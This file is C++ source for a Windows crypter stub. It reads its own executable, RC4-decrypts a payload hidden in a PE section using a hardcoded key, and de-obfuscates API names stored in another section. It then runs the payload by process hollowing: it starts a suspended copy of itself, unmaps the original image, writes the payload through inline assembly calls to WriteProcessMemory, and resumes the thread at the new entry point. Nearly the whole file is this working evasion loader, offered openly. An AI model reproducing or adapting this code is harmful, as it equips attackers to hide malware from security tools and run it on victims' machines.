	
#include <Windows.h>
#include <tlhelp32.h>

//############################################# Declarations #########################################################
struct SelfPE
{
    char  *  m_SelfPath;
	DWORD m_SelfSize;
    HANDLE  m_SelfHandle;
	PVOID   m_SelfPtr;
};
PVOID xmemcpy(PVOID, const PVOID, size_t);
VOID LoadAPI();
VOID Crypt0PE(PCHAR, DWORD);
VOID Runpe(LPVOID, SelfPE *);
BOOL LoadPEFromSec(SelfPE *);
BOOL LoadStuffFromSec(SelfPE *);
PCHAR XORED(PCHAR, int);
SelfPE * SelfStruc();

//####################################################################################################################

// String for API;
PCHAR m_ntdll_api_name;
PCHAR m_kernel32_api_name;

PCHAR m_NtUnmapViewOfSection_api_name;
PCHAR m_CreateProcessA_api_name;
PCHAR m_GetThreadContext_api_name;
PCHAR m_ReadProcessMemory_api_name;
PCHAR m_WriteProcessMemory_api_name;
PCHAR m_SetThreadContext_api_name;
PCHAR m_ResumeThread_api_name;
PCHAR m_VirtualAllocEx_api_name;
PCHAR m_VirtualFree_api_name;



//############################################# TypeDef API ##########################################################
typedef LONG  (WINAPI * ZNtUnmapViewOfSection)(HANDLE, PVOID);
typedef LPVOID(WINAPI * ZVirtualAlloc)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL (WINAPI * ZCreateProcessA)(LPCTSTR,LPTSTR,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES,BOOL,DWORD,LPVOID,LPCTSTR,LPSTARTUPINFO,LPPROCESS_INFORMATION);
typedef BOOL (WINAPI * ZGetThreadContext)(HANDLE,LPCONTEXT);
typedef BOOL (WINAPI * ZReadProcessMemory)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T);
typedef BOOL (WINAPI * ZWriteProcessMemory)(HANDLE,LPCVOID,LPVOID,SIZE_T,SIZE_T*);
typedef BOOL (WINAPI * ZSetThreadContext)(HANDLE, CONTEXT *);
typedef DWORD (WINAPI * ZResumeThread)(HANDLE);
typedef LPVOID (WINAPI * ZVirtualAllocEx)(HANDLE,LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL (WINAPI * ZVirtualFree)(LPVOID,SIZE_T,DWORD);
//####################################################################################################################

//############################################  Membres  #############################################################
LPVOID  m_PeFile;
DWORD   m_PeSize;
DWORD   m_StuffSize;
ZNtUnmapViewOfSection xNtUnmapViewOfSection;	
ZVirtualAlloc xVirtualAlloc;
ZCreateProcessA xCreateProcessA;
ZGetThreadContext xGetThreadContext;
ZReadProcessMemory xReadProcessMemory;
ZWriteProcessMemory xWriteProcessMemory;
ZSetThreadContext xSetThreadContext;
ZResumeThread xResumeThread;
ZVirtualAllocEx xVirtualAllocEx;
ZVirtualFree xVirtualFree;

//####################################################################################################################




int _stdcall  WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	 
	SelfPE * s = SelfStruc();
	if(LoadPEFromSec(s))
	{
		if(LoadStuffFromSec(s))
		{
			LoadAPI();

		    PCHAR tmp;
		    tmp = (PCHAR)VirtualAlloc(0, m_PeSize, MEM_COMMIT, PAGE_READWRITE);
		    xmemcpy(tmp, m_PeFile, m_PeSize);
		    Crypt0PE(tmp, m_PeSize);
		    Runpe(tmp, s);
		
		}
	}
	return 0;
}




SelfPE * SelfStruc()
{
	char    SelfPath[1024];
	GetModuleFileName(0, SelfPath, 1024); 
	DWORD Readed;
	SelfPE *s = (SelfPE *)GlobalAlloc(GPTR, sizeof SelfPE);
	s->m_SelfPath = SelfPath;
	//s->m_SelfHandle = CreateFile("C:\\Users\\und3ath\\Desktop\\boo.exe", GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	s->m_SelfHandle = CreateFile(SelfPath, GENERIC_READ, 0, NULL, OPEN_ALWAYS, 0, NULL);
	if(s->m_SelfHandle)
	{
		s->m_SelfSize = GetFileSize(s->m_SelfHandle, NULL);
		s->m_SelfPtr = (PVOID)GlobalAlloc(GPTR, s->m_SelfSize);
		ReadFile(s->m_SelfHandle, s->m_SelfPtr, s->m_SelfSize, & Readed, NULL);
	    CloseHandle(s->m_SelfHandle);
	}
	return s;
}

PVOID xmemcpy(PVOID dest, const PVOID src, size_t count)
{
        PCHAR dst8 = (PCHAR)dest;
        PCHAR src8 = (PCHAR)src;
        while (count--)
		{   
			__asm
			{
				mov   eax, dword ptr [dst8];  
                mov   ecx, dword ptr [src8]; 
                mov   dl, byte ptr [ecx];  
                mov   byte ptr [eax], dl;  
                mov   eax, dword ptr [dst8];  
                add   eax, 1;  
                mov   dword ptr [dst8], eax;  
                mov   ecx, dword ptr [src8];  
                add   ecx, 1;  
                mov   dword ptr [src8], ecx;
			}
        }
        return dest;
 }

VOID LoadAPI()
{
	 xNtUnmapViewOfSection = ZNtUnmapViewOfSection(GetProcAddress(GetModuleHandleA(m_ntdll_api_name),   m_NtUnmapViewOfSection_api_name));  
	 xCreateProcessA = ZCreateProcessA(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_CreateProcessA_api_name));  
	 xGetThreadContext = ZGetThreadContext(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_GetThreadContext_api_name));  
	 xReadProcessMemory = ZReadProcessMemory(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_ReadProcessMemory_api_name)); 
	 xWriteProcessMemory = ZWriteProcessMemory(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_WriteProcessMemory_api_name));
	 xSetThreadContext = ZSetThreadContext(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_SetThreadContext_api_name));
	 xResumeThread = ZResumeThread(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_ResumeThread_api_name));
	 xVirtualAllocEx = ZVirtualAllocEx(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_VirtualAllocEx_api_name));
	 xVirtualFree = ZVirtualFree(GetProcAddress(GetModuleHandleA( m_kernel32_api_name),   m_VirtualFree_api_name));
}


PCHAR XORED(PCHAR RData, int Rsize)
{
   PCHAR n;
	n = (PCHAR)GlobalAlloc(GPTR, Rsize);
	xmemcpy(n, RData, Rsize);
    for (int i = 0; i < Rsize; i++)
	{
        n[i] -= 10;
	}
	return n;
}

VOID Crypt0PE(PCHAR inp, DWORD inplen)
{
	
    char Sbox[257], Sbox2[257];
    DWORD i, j, t, x;
    static const char  OurUnSecuredKey[] = "www.undeth.com";
    static const int OurKeyLen = lstrlen(OurUnSecuredKey);    
    char temp;
	char k;
    i = j = k = t = x = 0;
    temp = 0;
    SecureZeroMemory(Sbox, sizeof(Sbox));
    SecureZeroMemory(Sbox2, sizeof(Sbox2));
    for(i = 0; i < 256U; i++)
    {
        Sbox[i] = (char)i;
    }
    j = 0;
   
        for(i = 0; i < 256U ; i++)
        {
            if(j == OurKeyLen)
            {
                j = 0;
            }
            Sbox2[i] = OurUnSecuredKey[j++];
        } 
    j = 0 ; 
    for(i = 0; i < 256; i++)
    {
        j = (j + (DWORD) Sbox[i] + (DWORD) Sbox2[i]) % 256U ;
        temp =  Sbox[i];                    
        Sbox[i] = Sbox[j];
        Sbox[j] =  temp;
    }

    i = j = 0;
    for(x = 0; x < inplen; x++)
    {
        i = (i + 1U) % 256U;
        j = (j + (DWORD) Sbox[i]) % 256U;
        temp = Sbox[i];
        Sbox[i] = Sbox[j] ;
        Sbox[j] = temp;
        t = ((DWORD) Sbox[i] + (DWORD) Sbox[j]) %  256U ;
        k = Sbox[t];
        inp[x] = (inp[x] ^ k);
    }    
}

VOID Runpe(LPVOID pFile, SelfPE * pex)
{

	PIMAGE_DOS_HEADER       Image_Dos_Header;
	PIMAGE_NT_HEADERS       Image_NT_Header;
	PIMAGE_SECTION_HEADER   Image_Sections_Header;
    PROCESS_INFORMATION m_Process_Info;
    STARTUPINFO m_Startup_Info;  
    PCONTEXT CTX;
    PDWORD dwImageBase;
	LPVOID pImageBase;

    Image_Dos_Header = PIMAGE_DOS_HEADER(pFile);
    if (Image_Dos_Header->e_magic == IMAGE_DOS_SIGNATURE)
    {		
        Image_NT_Header = PIMAGE_NT_HEADERS(DWORD(pFile) + Image_Dos_Header->e_lfanew);	
        if(Image_NT_Header->Signature == IMAGE_NT_SIGNATURE)
        {
            SecureZeroMemory(& m_Startup_Info, sizeof(m_Startup_Info));
            SecureZeroMemory(& m_Process_Info, sizeof(m_Process_Info));
            if(!xCreateProcessA((LPCTSTR)pex->m_SelfPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, & m_Startup_Info, & m_Process_Info))
            {
				goto ENDINLINE;
			}
            CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;



            if(!xGetThreadContext(m_Process_Info.hThread, LPCONTEXT(CTX)))
            {  
		     	goto ENDINLINE;
		    }
			__asm
			{

				push NULL;
				push 4;
				lea eax, DWORD PTR[dwImageBase];
				push eax;
				mov ebx, DWORD PTR[CTX];
				mov ecx, DWORD PTR[ebx + 164];
				add ecx, 8;
				push ecx;
				push m_Process_Info.hProcess;
				call DWORD PTR[xReadProcessMemory];
			}
            if(DWORD(dwImageBase) == Image_NT_Header->OptionalHeader.ImageBase)
			{      	 					
				// xNtUnmapViewOfSection(m_Process_Info.hProcess, PVOID(dwImageBase));	
			    __asm
				{
				    mov eax, DWORD PTR[dwImageBase];
					push eax;
					mov ebx, m_Process_Info.hProcess;
					push ebx;
					call DWORD PTR[xNtUnmapViewOfSection];
				}

            }
            pImageBase = xVirtualAllocEx(m_Process_Info.hProcess, LPVOID(Image_NT_Header->OptionalHeader.ImageBase), Image_NT_Header->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
            if(!pImageBase)
            {  
				goto ENDINLINE;
			}
		        //xWriteProcessMemory(m_Process_Info.hProcess, pImageBase, pFile, Image_NT_Header->OptionalHeader.SizeOfHeaders, NULL);	
			__asm
			{
               push NULL;
			   mov eax, DWORD PTR[Image_NT_Header];
			   mov ecx, DWORD PTR[eax + 84];
			   push ecx;
			   mov ebx, pFile;
			   push ebx;
			   mov edx, pImageBase;
			   push edx;
			   mov eax, m_Process_Info.hProcess;
			   push eax;
			   mov edx, DWORD PTR[xWriteProcessMemory];
			   call edx;
			}
            for (int i(0); i < Image_NT_Header->FileHeader.NumberOfSections; i++)
            {
                Image_Sections_Header = PIMAGE_SECTION_HEADER(DWORD(pFile) + Image_Dos_Header->e_lfanew + 248 + (i * 40));
                        //xWriteProcessMemory(m_Process_Info.hProcess, LPVOID(DWORD(pImageBase) + Image_Sections_Header->VirtualAddress), LPVOID(DWORD(pFile) + Image_Sections_Header->PointerToRawData), Image_Sections_Header->SizeOfRawData, NULL); 
		    		    // xWriteProcessMemory(m_Process_Info.hProcess, pImageBase, pFile, Image_NT_Header->OptionalHeader.SizeOfHeaders, NULL);
				__asm
				{
					
					push 0;
					mov ecx, DWORD PTR[Image_Sections_Header];
					mov eax, DWORD PTR[ecx + 16];
					push eax;
					mov	edx, DWORD PTR [Image_Sections_Header];
	                mov	eax, DWORD PTR [pFile];
	                add	eax, DWORD PTR [edx+20];
			   		push eax;
					mov	ecx, DWORD PTR [Image_Sections_Header];
	                mov	edx, DWORD PTR [pImageBase];
                    add	edx, DWORD PTR [ecx+12];
	                push edx;
			    	mov	eax, DWORD PTR [m_Process_Info];
	                push	eax;
					call DWORD PTR[xWriteProcessMemory];
					nop;
					nop;
					nop;
					push NULL;
					mov eax, DWORD PTR[Image_NT_Header];
					mov ecx, DWORD PTR[eax + 84];
					push ecx;
					mov ebx, pFile;
					push ebx;
					mov edx, pImageBase;
					push edx;
					push m_Process_Info.hProcess;
					call DWORD PTR[xWriteProcessMemory];
				}
            }
		    	    // xWriteProcessMemory(m_Process_Info.hProcess, LPVOID(CTX->Ebx + 8), LPVOID( & Image_NT_Header->OptionalHeader.ImageBase), 4, NULL);	
			LPVOID a(LPVOID(CTX->Ebx + 8));
			LPVOID b(LPVOID( & Image_NT_Header->OptionalHeader.ImageBase));
			__asm
			{
				push NULL;
				push 4;
				mov eax, b;
				mov ebx, a;
				mov ecx, m_Process_Info.hProcess;

				push eax;
				push ebx;
				push ecx;

				call DWORD PTR[xWriteProcessMemory];
			}
            CTX->Eax = DWORD(pImageBase) + Image_NT_Header->OptionalHeader.AddressOfEntryPoint; 		        
			__asm
			{
					//xSetThreadContext(m_Process_Info.hThread, LPCONTEXT(CTX));
				mov eax, DWORD PTR[CTX];
				mov ebx, m_Process_Info.hThread;
				mov ecx, DWORD PTR[xSetThreadContext];
				push eax;
				push ebx;
				call ecx;
						// xResumeThread(m_Process_Info.hThread);	
				mov eax, m_Process_Info.hThread;
				mov ebx, xResumeThread;
				push eax;
				call ebx;
			}       		          
        }
    }	
	ENDINLINE:
    xVirtualFree(pFile, 0, MEM_RELEASE);	
}

BOOL LoadPEFromSec(SelfPE * pe)
{
	DWORD size;
	DWORD Readed;
	PVOID pFile;
	PIMAGE_DOS_HEADER IDH;
    PIMAGE_NT_HEADERS INH;
    
	pFile = pe->m_SelfPtr;
	IDH = PIMAGE_DOS_HEADER(pFile);
    if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
    {
        INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
        if(INH->Signature == IMAGE_NT_SIGNATURE)
        {
			  PIMAGE_SECTION_HEADER last_section = IMAGE_FIRST_SECTION(INH) + (INH->FileHeader.NumberOfSections - 2);
		      m_PeSize = last_section->SizeOfRawData;
			  m_PeFile = (PVOID)GlobalAlloc(GPTR,  m_PeSize);
		      xmemcpy(m_PeFile, LPVOID(DWORD(pFile) + last_section->PointerToRawData), m_PeSize);
		      return TRUE;
		}			
	}
	return FALSE;
}

BOOL LoadStuffFromSec(SelfPE * pe)
{

	char * tmparray[11];

    DWORD size;
	DWORD Readed;
	PVOID pFile;
	PIMAGE_DOS_HEADER IDH;
    PIMAGE_NT_HEADERS INH;
	PCHAR _tmp;  
	PCHAR _tmpFinal;
	pFile = pe->m_SelfPtr;
	IDH = PIMAGE_DOS_HEADER(pFile);
    if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
    {
        INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
        if(INH->Signature == IMAGE_NT_SIGNATURE)
        {
			  PIMAGE_SECTION_HEADER last_section = IMAGE_FIRST_SECTION(INH) + (INH->FileHeader.NumberOfSections - 1);
		      m_StuffSize = last_section->SizeOfRawData;
			  _tmp = (PCHAR)GlobalAlloc(GPTR,  m_StuffSize);
		      xmemcpy(_tmp, LPVOID(DWORD(pFile) + last_section->PointerToRawData), m_StuffSize);

			  _tmp = XORED(_tmp, strlen(_tmp));

			  char o(0x3c);   //RET 
			  char end(0x00);
			  int towritesize(0);
			  int arraypos(0);


			  for(int i(0); i < m_StuffSize; i++)
			  {
				  if(_tmp[i] == o)
				  {
					  towritesize = i;
					  tmparray[arraypos] = (PCHAR)VirtualAlloc(0, towritesize , MEM_COMMIT, PAGE_READWRITE);
					  xmemcpy(tmparray[arraypos], _tmp, towritesize);
					  arraypos += 1;
					  break;
				  }
			  }
			  while (towritesize < m_StuffSize - 1)
			  {
				   for(int i(towritesize + 1); i < m_StuffSize; i++)
			       {
				      if(_tmp[i] == o)
				      {
						  tmparray[arraypos] = (PCHAR)VirtualAlloc(0, i - towritesize - 1 , MEM_COMMIT, PAGE_READWRITE);
						  xmemcpy(tmparray[arraypos], &_tmp[towritesize + 1], i - towritesize - 1 );
						  arraypos += 1;
					      towritesize = i;
					      break;
				      }
					  else if(_tmp[i] == end)
				      {
						  goto EndLoop;
					  }				  			  
			      }
			  }
			  EndLoop:
		


			  m_ntdll_api_name = tmparray[0];
			  m_kernel32_api_name = tmparray[1];
			  m_NtUnmapViewOfSection_api_name = tmparray[2];
			  m_CreateProcessA_api_name = tmparray[3];
			  m_GetThreadContext_api_name = tmparray[4];
			  m_ReadProcessMemory_api_name = tmparray[5];
			  m_WriteProcessMemory_api_name = tmparray[6];
			  m_SetThreadContext_api_name = tmparray[7];
			  m_ResumeThread_api_name = tmparray[8];
			  m_VirtualAllocEx_api_name = tmparray[9];
			  m_VirtualFree_api_name = tmparray[10];
			
			  

			 /*
			  for(int i(towritesize + 1); i < m_StuffSize; i++)
			  {
				  if(_tmp[i] == o)
				  {
					  m_kernel32_api_name = (PCHAR)VirtualAlloc(0, i - towritesize, MEM_COMMIT, PAGE_READWRITE);
					  xmemcpy(m_kernel32_api_name, &_tmp[towritesize + 1], i - towritesize -1 );
					  towritesize = i;
					  break;
				  }
			  }

			  for(int i(towritesize + 1); i < m_StuffSize; i++)
			  {
				  if(_tmp[i] == o)
				  {
					  m_NtUnmapViewOfSection_api_name = (PCHAR)VirtualAlloc(0, i - towritesize, MEM_COMMIT, PAGE_READWRITE);
					  xmemcpy(m_NtUnmapViewOfSection_api_name, &_tmp[towritesize + 1], i - towritesize -1 );
					  towritesize = i;
					  break;
				  }
			  }*/

			 


		      return TRUE;

		}			
	}
	return FALSE;
}

